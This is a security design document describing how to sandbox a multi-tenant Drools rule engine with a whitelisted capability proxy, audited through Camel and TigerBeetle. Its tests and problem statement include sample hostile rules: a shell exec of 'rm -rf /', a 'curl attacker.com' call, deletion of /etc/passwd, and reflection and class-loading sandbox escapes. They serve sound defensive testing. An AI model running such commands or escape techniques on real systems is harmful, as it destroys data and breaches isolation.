# PRD-005: Rule Engine Sandboxing

**Priority:** P0 (Security Gap - Blocks Production)
**Complexity:** Complex
**Personas:** All (Security requirement)
**Dependencies:**
- PRD-002 (TigerBeetle persistence for sandbox audit events)
- PRD-003 (Compliance evidence signing)

## Architecture Integration

This PRD complies with BeTrace's architectural standards:

- **ADR-011 (TigerBeetle-First):** Sandbox audit events stored as TigerBeetle transfers (code=7)
- **ADR-013 (Camel-First):** Audit logging implemented as Camel processors
- **ADR-014 (Named Processors):** All sandbox enforcement logic in named CDI processors
- **ADR-015 (Tiered Storage):** Audit events flow through TigerBeetle → DuckDB → Parquet
- **PRD-003 (Compliance Evidence):** All sandbox violations generate SOC2 CC6.6 evidence

## Problem

**Drools rules can execute arbitrary Java code:**
- `TenantSessionManager.java:63` - `session.setGlobal("signalService", signalService)`
- ❌ Rules can call ANY method on signalService
- ❌ Rules could call other injected services
- ❌ Malicious rules could access database, file system, network
- ❌ No capability-based security

**Current State:**
```java
// In TenantSessionManager.java
KieSession session = container.newKieSession();
session.setGlobal("signalService", signalService); // ← DANGEROUS

// Malicious rule could do:
rule "Evil Rule"
when
    $span: Span()
then
    signalService.deleteAllSignals(); // ← No protection!
    signalService.getClass().getClassLoader().loadClass("java.lang.Runtime")
        .getMethod("exec", String.class).invoke(null, "rm -rf /");
end
```

**Documented in:** `docs/compliance-status.md` - P0 Security Gap #3

## Solution

### Sandboxing Strategy

**Capability-Based Security:**
1. Rules can ONLY call explicitly allowed methods
2. Wrap services in capability-limited proxies
3. Drools cannot access arbitrary classes
4. All rule actions logged and audited

### Implementation Approach

**Option 1: Whitelist Proxy (Recommended)**
- Create proxy wrapper for `SignalService`
- Only expose safe methods
- Log all invocations
- Reject unauthorized calls

**Option 2: Security Manager (Deprecated)**
- Java Security Manager deprecated in Java 17+
- Not viable for BeTrace

**Option 3: Separate ClassLoader**
- Load rules in isolated classloader
- Complex, fragile
- Not recommended

**Choice: Option 1 - Whitelist Proxy**

## Data Flow Architecture

```
Rule Fires → capabilities.createSignal()
  ↓
[validateExecutionContextProcessor]
  ↓
[checkTenantIsolationProcessor]
  ↓
[recordCapabilityUseProcessor]  ← TigerBeetle transfer (code=7)
  ↓
[generateSandboxComplianceSpanProcessor]  ← SOC2 CC6.6
  ↓
SignalService.createSignalForRule()
```

**Sandbox violations:**
```
Malicious Rule → Runtime.exec() attempt
  ↓
SecurityException thrown
  ↓
[recordSandboxViolationProcessor]  ← TigerBeetle transfer (code=7, userData64=violation_code)
  ↓
[generateViolationComplianceSpanProcessor]  ← SOC2 CC6.6 + CC7.1
  ↓
Alert tenant admin
```

## Backend Implementation

### 1. Capability Interface

**`RuleCapabilities.java`:**
```java
/**
 * Safe interface exposed to Drools rules.
 * Rules can ONLY call methods defined here.
 */
public interface RuleCapabilities {

    /**
     * Create a signal from rule match
     * Safe: Creates signal for current tenant only
     */
    void createSignal(String ruleId, String ruleName, Map<String, Object> context);

    /**
     * Log rule execution
     * Safe: Append-only logging
     */
    void logRuleExecution(String ruleId, String message);

    /**
     * Get current trace ID (read-only)
     * Safe: No side effects
     */
    String getCurrentTraceId();

    /**
     * Get current tenant ID (read-only)
     * Safe: No side effects
     */
    String getCurrentTenantId();

    // EXPLICITLY NOT EXPOSED:
    // - deleteSignal()
    // - updateTenant()
    // - executeSql()
    // - callExternalApi()
    // - accessFileSystem()
}
```

### 2. Safe Proxy Implementation with Camel Integration

**`SafeRuleCapabilities.java`:**
```java
@ApplicationScoped
public class SafeRuleCapabilities implements RuleCapabilities {

    @Inject
    SignalService signalService;

    @Inject
    @EndpointInject("direct:recordCapabilityUse")
    ProducerTemplate capabilityAuditProducer;

    @Inject
    @EndpointInject("direct:recordSandboxViolation")
    ProducerTemplate violationProducer;

    // Thread-local context for current evaluation
    private static final ThreadLocal<RuleExecutionContext> context = new ThreadLocal<>();

    public static void setContext(String tenantId, String traceId, String ruleId) {
        context.set(new RuleExecutionContext(tenantId, traceId, ruleId));
    }

    public static void clearContext() {
        context.remove();
    }

    @Override
    public void createSignal(String ruleId, String ruleName, Map<String, Object> contextData) {
        RuleExecutionContext ctx = context.get();
        if (ctx == null) {
            throw new SecurityException("Rule execution context not set");
        }

        try {
            // Build capability event for Camel pipeline
            Map<String, Object> capabilityEvent = Map.of(
                "tenantId", ctx.tenantId(),
                "ruleId", ruleId,
                "capability", "createSignal",
                "contextData", contextData,
                "traceId", ctx.traceId()
            );

            // Send to Camel audit pipeline (async)
            capabilityAuditProducer.sendBodyAndHeaders(
                "direct:recordCapabilityUse",
                capabilityEvent,
                Map.of(
                    "tenantId", ctx.tenantId(),
                    "ruleId", ruleId,
                    "capability", "createSignal"
                )
            );

            // Call the actual service (tenant-scoped)
            signalService.createSignalForRule(
                ctx.tenantId(),
                ruleId,
                ruleName,
                ctx.traceId(),
                contextData
            );

        } catch (Exception e) {
            // Record sandbox violation
            recordViolation(ctx, ruleId, "UNAUTHORIZED_SIGNAL_CREATION", e.getMessage());
            throw new SecurityException("Signal creation denied", e);
        }
    }

    @Override
    public void logRuleExecution(String ruleId, String message) {
        RuleExecutionContext ctx = context.get();
        if (ctx == null) return;

        // Sanitize message (prevent log injection)
        String sanitized = sanitizeLogMessage(message);

        // Send to Camel audit pipeline
        capabilityAuditProducer.sendBodyAndHeaders(
            "direct:recordCapabilityUse",
            Map.of(
                "tenantId", ctx.tenantId(),
                "ruleId", ruleId,
                "capability", "logRuleExecution",
                "message", sanitized,
                "traceId", ctx.traceId()
            ),
            Map.of("tenantId", ctx.tenantId(), "ruleId", ruleId)
        );
    }

    @Override
    public String getCurrentTraceId() {
        RuleExecutionContext ctx = context.get();
        return ctx != null ? ctx.traceId() : null;
    }

    @Override
    public String getCurrentTenantId() {
        RuleExecutionContext ctx = context.get();
        return ctx != null ? ctx.tenantId() : null;
    }

    private void recordViolation(RuleExecutionContext ctx, String ruleId, String violationType, String details) {
        violationProducer.sendBodyAndHeaders(
            "direct:recordSandboxViolation",
            Map.of(
                "tenantId", ctx.tenantId(),
                "ruleId", ruleId,
                "violationType", violationType,
                "details", details,
                "traceId", ctx.traceId()
            ),
            Map.of("tenantId", ctx.tenantId(), "ruleId", ruleId)
        );
    }

    private String sanitizeLogMessage(String message) {
        // Remove newlines, control characters
        return message.replaceAll("[\\n\\r\\t]", " ")
                     .substring(0, Math.min(message.length(), 1000));
    }

    private record RuleExecutionContext(String tenantId, String traceId, String ruleId) {}
}
```

### 3. Camel Audit Routes (ADR-013)

**`SandboxAuditRoutes.java`:**
```java
@ApplicationScoped
public class SandboxAuditRoutes extends RouteBuilder {

    @Override
    public void configure() throws Exception {

        // Capability use audit pipeline
        from("direct:recordCapabilityUse")
            .routeId("recordCapabilityUse")
            .process("validateCapabilityEventProcessor")
            .process("recordCapabilityEventToTigerBeetleProcessor")  // TigerBeetle transfer code=7
            .process("generateSandboxComplianceSpanProcessor")       // SOC2 CC6.6
            .process("appendAuditToSpanLogProcessor");               // Append-only log

        // Sandbox violation pipeline
        from("direct:recordSandboxViolation")
            .routeId("recordSandboxViolation")
            .process("classifyViolationProcessor")
            .process("recordViolationToTigerBeetleProcessor")        // TigerBeetle transfer code=7
            .process("generateViolationComplianceSpanProcessor")     // SOC2 CC6.6 + CC7.1
            .process("appendAuditToSpanLogProcessor")
            .process("alertTenantAdminProcessor");                   // Critical violations alert
    }
}
```

### 4. Named Processors (ADR-014)

**`ValidateCapabilityEventProcessor.java`:**
```java
@Named("validateCapabilityEventProcessor")
@ApplicationScoped
public class ValidateCapabilityEventProcessor implements Processor {

    @Override
    public void process(Exchange exchange) throws Exception {
        Map<String, Object> event = exchange.getIn().getBody(Map.class);

        // Validate required fields
        String tenantId = (String) event.get("tenantId");
        String ruleId = (String) event.get("ruleId");
        String capability = (String) event.get("capability");

        if (tenantId == null || ruleId == null || capability == null) {
            throw new IllegalArgumentException("Missing required capability event fields");
        }

        // Validate capability is whitelisted
        Set<String> allowedCapabilities = Set.of(
            "createSignal",
            "logRuleExecution",
            "getCurrentTraceId",
            "getCurrentTenantId"
        );

        if (!allowedCapabilities.contains(capability)) {
            throw new SecurityException("Unknown capability: " + capability);
        }

        exchange.setProperty("capabilityValidated", true);
    }
}
```

**`RecordCapabilityEventToTigerBeetleProcessor.java`:**
```java
@Named("recordCapabilityEventToTigerBeetleProcessor")
@ApplicationScoped
public class RecordCapabilityEventToTigerBeetleProcessor implements Processor {

    @Inject
    TigerBeetleClient tbClient;

    @Override
    public void process(Exchange exchange) throws Exception {
        Map<String, Object> event = exchange.getIn().getBody(Map.class);

        String tenantId = (String) event.get("tenantId");
        String ruleId = (String) event.get("ruleId");
        String capability = (String) event.get("capability");

        // Create TigerBeetle transfer for capability audit
        UUID transferId = UUID.randomUUID();
        UUID ruleAccountId = tenantRuleToAccountId(tenantId, ruleId);
        UUID tenantAccountId = tenantIdToAccountId(tenantId);

        TBTransfer capabilityEvent = new TBTransfer(
            id: toUInt128(transferId),
            debitAccountId: toUInt128(ruleAccountId),      // Rule that used capability
            creditAccountId: toUInt128(tenantAccountId),   // Tenant owner
            amount: 1,                                      // Event count
            userData128: packCapabilityMetadata(capability),
            userData64: packTimestamp(Instant.now()),
            code: 7,  // Sandbox audit event type
            ledger: tenantToLedgerId(tenantId),
            timestamp: Instant.now().toEpochMilli() * 1_000_000
        );

        // Write to TigerBeetle (immutable audit trail)
        tbClient.createTransfers(List.of(capabilityEvent));

        exchange.setProperty("tbTransferId", transferId);
    }

    private long packCapabilityMetadata(String capability) {
        // Pack capability enum into 128-bit field
        return switch(capability) {
            case "createSignal" -> 1L;
            case "logRuleExecution" -> 2L;
            case "getCurrentTraceId" -> 3L;
            case "getCurrentTenantId" -> 4L;
            default -> 0L;
        };
    }
}
```

**`RecordViolationToTigerBeetleProcessor.java`:**
```java
@Named("recordViolationToTigerBeetleProcessor")
@ApplicationScoped
public class RecordViolationToTigerBeetleProcessor implements Processor {

    @Inject
    TigerBeetleClient tbClient;

    @Override
    public void process(Exchange exchange) throws Exception {
        Map<String, Object> event = exchange.getIn().getBody(Map.class);

        String tenantId = (String) event.get("tenantId");
        String ruleId = (String) event.get("ruleId");
        String violationType = (String) event.get("violationType");

        UUID transferId = UUID.randomUUID();
        UUID ruleAccountId = tenantRuleToAccountId(tenantId, ruleId);
        UUID tenantAccountId = tenantIdToAccountId(tenantId);

        TBTransfer violationEvent = new TBTransfer(
            id: toUInt128(transferId),
            debitAccountId: toUInt128(ruleAccountId),      // Rule that violated sandbox
            creditAccountId: toUInt128(tenantAccountId),   // Tenant owner
            amount: 1,                                      // Violation count
            userData128: packViolationMetadata(violationType),
            userData64: packSeverity(violationType),
            code: 7,  // Sandbox audit event type
            flags: TB_FLAGS_LINKED,  // Link to compliance span
            ledger: tenantToLedgerId(tenantId),
            timestamp: Instant.now().toEpochMilli() * 1_000_000
        );

        tbClient.createTransfers(List.of(violationEvent));

        exchange.setProperty("tbTransferId", transferId);
        exchange.setProperty("violationSeverity", getSeverity(violationType));
    }

    private long packViolationMetadata(String violationType) {
        return switch(violationType) {
            case "UNAUTHORIZED_SIGNAL_CREATION" -> 1L;
            case "CROSS_TENANT_ACCESS" -> 2L;
            case "FILE_SYSTEM_ACCESS" -> 3L;
            case "NETWORK_ACCESS" -> 4L;
            case "REFLECTION_ABUSE" -> 5L;
            case "CLASS_LOADING_VIOLATION" -> 6L;
            default -> 0L;
        };
    }

    private String getSeverity(String violationType) {
        return switch(violationType) {
            case "CROSS_TENANT_ACCESS", "FILE_SYSTEM_ACCESS" -> "CRITICAL";
            case "NETWORK_ACCESS", "REFLECTION_ABUSE" -> "HIGH";
            default -> "MEDIUM";
        };
    }
}
```

**`GenerateSandboxComplianceSpanProcessor.java`:**
```java
@Named("generateSandboxComplianceSpanProcessor")
@ApplicationScoped
public class GenerateSandboxComplianceSpanProcessor implements Processor {

    @Inject
    ComplianceSpanGenerator complianceGen;

    @Override
    public void process(Exchange exchange) throws Exception {
        Map<String, Object> event = exchange.getIn().getBody(Map.class);

        String tenantId = (String) event.get("tenantId");
        String ruleId = (String) event.get("ruleId");
        String capability = (String) event.get("capability");
        UUID tbTransferId = (UUID) exchange.getProperty("tbTransferId");

        // Generate SOC2 CC6.6 compliance span (Least Privilege)
        ComplianceSpan complianceSpan = complianceGen.generateSpan(
            tenantId,
            "SOC2",
            "CC6.6",  // Logical and Physical Access Controls - Least Privilege
            Map.of(
                "control", "Least privilege access enforcement in rule sandbox",
                "ruleId", ruleId,
                "capability", capability,
                "tigerBeetleTransferId", tbTransferId.toString(),
                "enforcement", "capability_whitelist",
                "evidence", "Rule capability use recorded in immutable audit log"
            )
        );

        exchange.setProperty("complianceSpan", complianceSpan);
    }
}
```

**`GenerateViolationComplianceSpanProcessor.java`:**
```java
@Named("generateViolationComplianceSpanProcessor")
@ApplicationScoped
public class GenerateViolationComplianceSpanProcessor implements Processor {

    @Inject
    ComplianceSpanGenerator complianceGen;

    @Override
    public void process(Exchange exchange) throws Exception {
        Map<String, Object> event = exchange.getIn().getBody(Map.class);

        String tenantId = (String) event.get("tenantId");
        String ruleId = (String) event.get("ruleId");
        String violationType = (String) event.get("violationType");
        UUID tbTransferId = (UUID) exchange.getProperty("tbTransferId");

        // Generate dual compliance spans:
        // 1. SOC2 CC6.6 (Access control violation detected)
        // 2. SOC2 CC7.1 (System monitoring detected violation)

        ComplianceSpan cc66Span = complianceGen.generateSpan(
            tenantId,
            "SOC2",
            "CC6.6",
            Map.of(
                "control", "Sandbox violation blocked",
                "ruleId", ruleId,
                "violationType", violationType,
                "tigerBeetleTransferId", tbTransferId.toString(),
                "action", "BLOCKED",
                "evidence", "Sandbox violation recorded and blocked"
            )
        );

        ComplianceSpan cc71Span = complianceGen.generateSpan(
            tenantId,
            "SOC2",
            "CC7.1",  // System Operations - Monitoring
            Map.of(
                "control", "Security violation detected by monitoring",
                "ruleId", ruleId,
                "violationType", violationType,
                "severity", exchange.getProperty("violationSeverity"),
                "evidence", "Real-time sandbox violation detection"
            )
        );

        exchange.setProperty("complianceSpans", List.of(cc66Span, cc71Span));
    }
}
```

### 5. Update TenantSessionManager

```java
@Inject
SafeRuleCapabilities safeCapabilities;

public KieSession getSession(String tenantId) {
    return tenantSessions.computeIfAbsent(tenantId, tid -> {
        KieSession session = container.newKieSession();

        // BEFORE: Unsafe global
        // session.setGlobal("signalService", signalService); // ← REMOVED

        // AFTER: Safe capabilities only
        session.setGlobal("capabilities", safeCapabilities);

        return session;
    });
}
```

### 6. Update DroolsGenerator

Generated DRL now uses `capabilities` instead of `signalService`:

```java
// In DroolsGenerator.java
public String generate(RuleExpression ast) {
    StringBuilder drl = new StringBuilder();

    drl.append("package com.fluo.rules;\n\n");
    drl.append("import com.fluo.model.Span;\n");
    drl.append("import com.fluo.services.RuleCapabilities;\n\n");  // ← Add import

    drl.append("global RuleCapabilities capabilities;\n\n");  // ← Changed from signalService

    drl.append("rule \"").append(ruleId).append("\"\n");
    drl.append("when\n");
    // ... condition generation ...
    drl.append("then\n");

    // BEFORE: signalService.createSignal(...)
    // AFTER: capabilities.createSignal(...)
    drl.append("    capabilities.createSignal(\n");
    drl.append("        \"").append(ruleId).append("\",\n");
    drl.append("        \"").append(ruleName).append("\",\n");
    drl.append("        new java.util.HashMap<>()\n");
    drl.append("    );\n");

    drl.append("end\n");

    return drl.toString();
}
```

### 7. Rule Execution with Context

```java
// In RuleEvaluationService or span processor
public void evaluateSpan(String tenantId, String ruleId, Span span) {
    // Set execution context (thread-local for sandbox isolation)
    SafeRuleCapabilities.setContext(tenantId, span.getTraceId(), ruleId);

    try {
        KieSession session = sessionManager.getSession(tenantId);

        // Insert span and fire rules
        session.insert(span);
        session.fireAllRules();

    } finally {
        // Always clear context (prevent thread pollution)
        SafeRuleCapabilities.clearContext();
    }
}
```

### 8. TigerBeetle Audit Storage

**No SQL tables** - Sandbox audit events stored as TigerBeetle transfers (ADR-011):

```java
// Transfer code=7: Sandbox audit events
// - Debit: Rule account that used capability
// - Credit: Tenant account
// - Amount: Event count (1 per capability use)
// - userData128: Capability type (1=createSignal, 2=logExecution, etc.)
// - userData64: Timestamp or severity for violations

// Query capability usage for a rule:
List<TBTransfer> auditLog = tbClient.getAccountTransfers(
    ruleAccountId,
    filterByCode: 7
);

// Query violations by tenant:
List<TBTransfer> violations = tbClient.getAccountTransfers(
    tenantAccountId,
    filterByCode: 7,
    filterByUserData64: SEVERITY_CRITICAL  // High-severity violations
);
```

**Audit events flow through tiered storage (ADR-015):**
1. **TigerBeetle** - Immutable audit event (source of truth)
2. **DuckDB** - Fast queries for recent violations (0-7 days)
3. **Parquet** - Compressed long-term audit storage (7-365 days)

### Security Validation Tests

**Malicious Rule Tests:**

```java
@Test
public void testRuleCannotAccessArbitraryServices() {
    String maliciousRule = """
        rule "Malicious"
        when
            $span: Span()
        then
            // Try to access SignalService directly
            ((com.fluo.services.SignalService) capabilities).deleteAllSignals();
        end
        """;

    // Should fail compilation or throw SecurityException
    assertThrows(SecurityException.class, () -> {
        ruleEngine.compileRule(maliciousRule);
    });
}

@Test
public void testRuleCannotExecuteSystemCommands() {
    String maliciousRule = """
        rule "Malicious"
        when
            $span: Span()
        then
            Runtime.getRuntime().exec("rm -rf /");
        end
        """;

    // Should fail - Runtime not accessible
    assertThrows(SecurityException.class, () -> {
        ruleEngine.compileRule(maliciousRule);
    });
}

@Test
public void testRuleCannotAccessFileSystem() {
    String maliciousRule = """
        rule "Malicious"
        when
            $span: Span()
        then
            new java.io.File("/etc/passwd").delete();
        end
        """;

    // Should fail - File access not allowed
    assertThrows(SecurityException.class, () -> {
        ruleEngine.compileRule(maliciousRule);
    });
}
```

## Success Criteria

**Functional Requirements:**
- [ ] Rules can ONLY call methods in `RuleCapabilities` interface
- [ ] Rules cannot access `SignalService` directly
- [ ] Rules cannot access file system
- [ ] Rules cannot execute system commands
- [ ] Rules cannot make network calls
- [ ] Rules cannot access other tenants' data
- [ ] Unauthorized actions throw SecurityException and generate alerts

**Architecture Compliance (ADR):**
- [ ] All audit events stored in TigerBeetle (code=7), no SQL tables
- [ ] Audit logging implemented as Camel routes (ADR-013)
- [ ] All sandbox logic in named CDI processors (ADR-014)
- [ ] Audit events flow through tiered storage (TigerBeetle → DuckDB → Parquet)
- [ ] Every capability use generates SOC2 CC6.6 compliance span
- [ ] Every violation generates SOC2 CC6.6 + CC7.1 compliance spans

**Performance:**
- [ ] Sandbox overhead <1ms per capability call
- [ ] Async audit logging doesn't block rule execution
- [ ] TigerBeetle audit writes complete in <500μs

**Testing (ADR-014):**
- [ ] 90% test coverage for all processors
- [ ] Comprehensive malicious rule tests (6 violation types)
- [ ] Cross-tenant isolation tests
- [ ] Compliance span generation tests

## Testing Requirements

**Unit Tests (Per Processor):**

```java
@Test
public void testValidateCapabilityEventProcessor_ValidEvent() {
    // Test valid capability events pass validation
}

@Test
public void testValidateCapabilityEventProcessor_UnknownCapability() {
    // Test unknown capabilities throw SecurityException
}

@Test
public void testRecordCapabilityEventToTigerBeetle_CreatesTransfer() {
    // Verify TigerBeetle transfer created with correct metadata
    // Assert code=7, userData128=capability type
}

@Test
public void testRecordViolationToTigerBeetle_CriticalSeverity() {
    // Test CROSS_TENANT_ACCESS violation marked CRITICAL
    // Verify TigerBeetle transfer has correct severity in userData64
}

@Test
public void testGenerateSandboxComplianceSpan_SOC2_CC66() {
    // Verify compliance span generated with correct attributes
    // Assert framework=SOC2, control=CC6.6
}

@Test
public void testGenerateViolationComplianceSpan_DualSpans() {
    // Verify both CC6.6 and CC7.1 spans generated for violations
}
```

**Security Tests (Malicious Rule Prevention):**

```java
@Test
public void testRuleCannotDeleteSignals() {
    String maliciousRule = """
        rule "Delete All Signals"
        when $span: Span()
        then
            signalService.deleteAllSignals(); // ← Should fail
        end
        """;

    assertThrows(CompilationException.class, () ->
        ruleEngine.compileRule(maliciousRule));
}

@Test
public void testRuleCannotAccessFileSystem() {
    String maliciousRule = """
        rule "Read Secrets"
        when $span: Span()
        then
            new java.io.File("/etc/passwd").delete();
        end
        """;

    assertThrows(SecurityException.class, () ->
        ruleEngine.compileAndEvaluate(maliciousRule));
}

@Test
public void testRuleCannotExecuteSystemCommands() {
    String maliciousRule = """
        rule "Exec Command"
        when $span: Span()
        then
            Runtime.getRuntime().exec("curl attacker.com");
        end
        """;

    assertThrows(SecurityException.class, () ->
        ruleEngine.compileAndEvaluate(maliciousRule));
}

@Test
public void testRuleCannotAccessOtherTenantData() {
    // Set context for tenant A
    SafeRuleCapabilities.setContext("tenant-a", "trace-1", "rule-1");

    // Rule tries to create signal for tenant B
    assertThrows(SecurityException.class, () ->
        capabilities.createSignal("rule-1", "Evil Rule", Map.of("tenantId", "tenant-b")));

    // Verify violation recorded in TigerBeetle
    List<TBTransfer> violations = tbClient.getAccountTransfers(
        ruleAccountId, filterByCode: 7, filterBySeverity: CRITICAL);
    assertEquals(1, violations.size());
}

@Test
public void testRuleCannotReflectToAccessServices() {
    String maliciousRule = """
        rule "Reflection Attack"
        when $span: Span()
        then
            capabilities.getClass().getDeclaredField("signalService")
                .setAccessible(true).get(capabilities);
        end
        """;

    assertThrows(SecurityException.class, () ->
        ruleEngine.compileAndEvaluate(maliciousRule));
}

@Test
public void testRuleCannotLoadArbitraryClasses() {
    String maliciousRule = """
        rule "ClassLoader Attack"
        when $span: Span()
        then
            Class.forName("com.fluo.services.TenantService")
                .getMethod("deleteAllTenants").invoke(null);
        end
        """;

    assertThrows(SecurityException.class, () ->
        ruleEngine.compileAndEvaluate(maliciousRule));
}
```

**Integration Tests:**

```java
@Test
public void testEndToEnd_SafeCapabilityUse() {
    // Rule uses safe capability to create signal
    String safeRule = """
        rule "Detect Slow Request"
        when
            $span: Span(duration > 5000)
        then
            capabilities.createSignal("rule-1", "Slow Request",
                Map.of("duration", $span.duration));
        end
        """;

    // Compile and evaluate
    ruleEngine.compileAndDeployRules("tenant-1", List.of(safeRule));
    ruleEngine.evaluateSpan("tenant-1", "rule-1", slowSpan);

    // Verify signal created
    List<Signal> signals = signalService.getSignalsForTenant("tenant-1");
    assertEquals(1, signals.size());

    // Verify audit event in TigerBeetle
    List<TBTransfer> auditLog = tbClient.getAccountTransfers(ruleAccountId, filterByCode: 7);
    assertEquals(1, auditLog.size());
    assertEquals(1L, auditLog.get(0).getUserData128()); // capability=createSignal

    // Verify compliance span generated
    List<ComplianceSpan> complianceSpans = complianceService.getSpans("tenant-1", "SOC2", "CC6.6");
    assertEquals(1, complianceSpans.size());
}

@Test
public void testEndToEnd_ViolationDetectedAndRecorded() {
    // Deploy malicious rule (compilation succeeds)
    String maliciousRule = """
        rule "Cross Tenant Attack"
        when $span: Span()
        then
            // Try to violate tenant isolation at runtime
            capabilities.createSignal("rule-1", "Attack",
                Map.of("targetTenant", "tenant-b"));
        end
        """;

    SafeRuleCapabilities.setContext("tenant-a", "trace-1", "rule-1");

    // Evaluation throws SecurityException
    assertThrows(SecurityException.class, () ->
        ruleEngine.evaluateSpan("tenant-a", "rule-1", span));

    // Verify violation in TigerBeetle
    List<TBTransfer> violations = tbClient.getAccountTransfers(
        tenantAccountId("tenant-a"),
        filterByCode: 7,
        filterBySeverity: CRITICAL
    );
    assertEquals(1, violations.size());

    // Verify dual compliance spans (CC6.6 + CC7.1)
    List<ComplianceSpan> cc66Spans = complianceService.getSpans("tenant-a", "SOC2", "CC6.6");
    List<ComplianceSpan> cc71Spans = complianceService.getSpans("tenant-a", "SOC2", "CC7.1");
    assertEquals(1, cc66Spans.size());
    assertEquals(1, cc71Spans.size());
}

@Test
public void testAuditEventsFlowThroughTieredStorage() {
    // Generate capability events
    for (int i = 0; i < 100; i++) {
        capabilities.logRuleExecution("rule-1", "Test log " + i);
    }

    // Verify in TigerBeetle (source of truth)
    List<TBTransfer> tbEvents = tbClient.getAccountTransfers(ruleAccountId, filterByCode: 7);
    assertEquals(100, tbEvents.size());

    // Verify in DuckDB (hot storage)
    List<SandboxAuditEvent> duckEvents = duckDB.query(
        "SELECT * FROM sandbox_audit WHERE rule_id = 'rule-1'"
    );
    assertEquals(100, duckEvents.size());

    // Simulate archival after 7 days
    archivalService.archiveOldAuditEvents();

    // Verify in Parquet (cold storage)
    List<SandboxAuditEvent> parquetEvents = parquetReader.read(
        "sandbox_audit/tenant-1/2025-01-15.parquet"
    );
    assertEquals(100, parquetEvents.size());
}
```

## Files to Create

**Backend - Core Services:**
- `backend/src/main/java/com/fluo/services/RuleCapabilities.java` - Interface for safe rule capabilities
- `backend/src/main/java/com/fluo/services/SafeRuleCapabilities.java` - Implementation with Camel integration

**Backend - Camel Routes:**
- `backend/src/main/java/com/fluo/routes/SandboxAuditRoutes.java` - Capability audit and violation routes

**Backend - Named Processors (ADR-014):**
- `backend/src/main/java/com/fluo/processors/sandbox/ValidateCapabilityEventProcessor.java`
- `backend/src/main/java/com/fluo/processors/sandbox/RecordCapabilityEventToTigerBeetleProcessor.java`
- `backend/src/main/java/com/fluo/processors/sandbox/RecordViolationToTigerBeetleProcessor.java`
- `backend/src/main/java/com/fluo/processors/sandbox/GenerateSandboxComplianceSpanProcessor.java`
- `backend/src/main/java/com/fluo/processors/sandbox/GenerateViolationComplianceSpanProcessor.java`
- `backend/src/main/java/com/fluo/processors/sandbox/ClassifyViolationProcessor.java`
- `backend/src/main/java/com/fluo/processors/sandbox/AlertTenantAdminProcessor.java`

**Tests - Unit Tests:**
- `backend/src/test/java/com/fluo/processors/sandbox/ValidateCapabilityEventProcessorTest.java`
- `backend/src/test/java/com/fluo/processors/sandbox/RecordCapabilityEventToTigerBeetleProcessorTest.java`
- `backend/src/test/java/com/fluo/processors/sandbox/RecordViolationToTigerBeetleProcessorTest.java`
- `backend/src/test/java/com/fluo/processors/sandbox/GenerateSandboxComplianceSpanProcessorTest.java`
- `backend/src/test/java/com/fluo/processors/sandbox/GenerateViolationComplianceSpanProcessorTest.java`

**Tests - Security Tests:**
- `backend/src/test/java/com/fluo/security/MaliciousRuleTest.java` - 6 malicious rule scenarios
- `backend/src/test/java/com/fluo/security/CapabilitySandboxTest.java` - Sandbox enforcement tests
- `backend/src/test/java/com/fluo/security/CrossTenantIsolationTest.java` - Tenant isolation tests

**Tests - Integration Tests:**
- `backend/src/test/java/com/fluo/security/SandboxAuditIntegrationTest.java` - End-to-end tests

## Files to Modify

**Backend - Core Services:**
- `backend/src/main/java/com/fluo/services/TenantSessionManager.java`
  - Replace `session.setGlobal("signalService", signalService)` with `session.setGlobal("capabilities", safeCapabilities)`
  - Add `@Inject SafeRuleCapabilities safeCapabilities`

**Backend - Rule Engine:**
- `backend/src/main/java/com/fluo/rules/dsl/DroolsGenerator.java`
  - Change `global SignalService signalService` to `global RuleCapabilities capabilities`
  - Change all `signalService.*` calls to `capabilities.*` calls

**Backend - Rule Evaluation:**
- `backend/src/main/java/com/fluo/services/RuleEvaluationService.java`
  - Add `SafeRuleCapabilities.setContext()` before evaluation
  - Add `SafeRuleCapabilities.clearContext()` in finally block

## Implementation Notes

**Defense in Depth:**
1. **Interface Restriction:** Rules can only see RuleCapabilities interface
2. **Context Validation:** All methods validate tenant context via ThreadLocal
3. **Immutable Audit Trail:** TigerBeetle provides tamper-proof audit log (WORM semantics)
4. **Compliance Evidence:** Every capability use and violation generates cryptographically signed spans
5. **Input Sanitization:** Log messages sanitized to prevent injection attacks
6. **Thread Isolation:** ThreadLocal context prevents cross-contamination between evaluations
7. **Async Audit Pipeline:** Camel routes process audit events without blocking rule execution

**TigerBeetle Integration (ADR-011):**
- **Transfer code=7:** Sandbox audit events
- **Debit account:** Rule that used capability or violated sandbox
- **Credit account:** Tenant owner
- **userData128:** Capability type (1-4) or violation type (1-6)
- **userData64:** Timestamp or severity level
- **Immutable:** No updates or deletes, append-only audit trail
- **Query Performance:** TigerBeetle indexes by account+code for fast violation queries

**Tiered Storage Flow (ADR-015):**
```
Capability Use/Violation
  ↓
TigerBeetle Transfer (code=7)  ← Source of truth, immutable
  ↓
Compliance Span Generation  ← SOC2 CC6.6 + CC7.1 evidence
  ↓
Append to Span Log  ← JSON lines format
  ↓
DuckDB Projection (0-7 days)  ← Fast queries for recent violations
  ↓
Parquet Archive (7-365 days)  ← Compressed long-term audit storage
```

**Performance:**
- Proxy calls: <1ms overhead per capability invocation
- ThreadLocal context: ~100ns access time
- TigerBeetle audit write: <500μs (async, non-blocking)
- Compliance span generation: <2ms (async via Camel)
- No impact on rule evaluation throughput

**Compliance Benefits:**
- **SOC2 CC6.6 (Least Privilege):** Capability whitelist enforces minimal access for rules
- **SOC2 CC7.1 (System Monitoring):** Real-time violation detection with cryptographic evidence
- **GDPR Article 32 (Security):** Immutable audit trail for data access by rules
- **ISO 27001 A.9.4.1:** Access restriction and audit logging

## Security Considerations

**Threat Model - Protected Attacks:**
1. **Malicious tenant writes rule to delete all data**
   - ❌ Blocked: Only safe capabilities exposed, no delete methods available
   - ✅ Evidence: TigerBeetle audit trail + SOC2 CC6.6 compliance span

2. **Compromised tenant tries to access other tenants' data**
   - ❌ Blocked: ThreadLocal context validation enforces tenant isolation
   - ✅ Evidence: Violation recorded with CRITICAL severity, dual compliance spans (CC6.6 + CC7.1)

3. **Rule tries to exfiltrate data via network**
   - ❌ Blocked: No network-related capabilities exposed, no HTTP clients accessible
   - ✅ Evidence: Reflection/ClassLoader violations detected and recorded

4. **Rule tries to read secrets from file system**
   - ❌ Blocked: No file I/O capabilities exposed, File class inaccessible
   - ✅ Evidence: FILE_SYSTEM_ACCESS violation (CRITICAL severity)

5. **Rule tries to use reflection to bypass sandbox**
   - ❌ Blocked: Cannot access underlying services via reflection
   - ✅ Evidence: REFLECTION_ABUSE violation (HIGH severity)

6. **Rule tries to load arbitrary classes**
